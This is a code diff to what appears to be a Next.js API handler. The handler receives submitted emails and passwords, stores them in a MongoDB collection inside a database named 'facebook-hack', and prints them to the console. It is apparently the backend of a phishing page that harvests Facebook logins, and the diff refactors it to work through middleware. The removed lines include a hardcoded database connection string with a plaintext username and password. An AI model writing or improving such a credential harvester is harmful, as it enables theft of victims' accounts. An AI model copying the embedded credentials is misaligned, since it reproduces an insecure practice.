@@ -1,4 +1,5 @@
-import { MongoClient } from "mongodb";
+import withMiddleware from "../../middlewares/withMiddleware";
+
 
 
 const handler = async (req, res) => {
@@ -10,20 +11,12 @@ const handler = async (req, res) => {
     // conexion base de datos
 
     try {
-      const client = new MongoClient('mongodb+srv://sebas:1234@cluster0.z513b.mongodb.net/myFirstDatabase?retryWrites=true&w=majority', {
-        useUnifiedTopology: true,
-        useNewUrlParser: true
-      })
 
-      if (!client.isConnected()) {
-        client.connect().then(async () => {
-          await client.db('facebook-hack').collection('users').insertOne({ email, password })
-        })
-      }
+      await req.db('facebook-hack').collection('users').insertOne({ email, password })
 
     } catch (error) {
       console.log(error)
-      res.status(400).json({ message: 'password and email saved' })
+      res.status(400).json({ message: 'error de servidor' })
     }
 
     console.log(email, password)
@@ -36,6 +29,6 @@ const handler = async (req, res) => {
 
 }
 
-export default handler
+export default withMiddleware(handler)
 
 
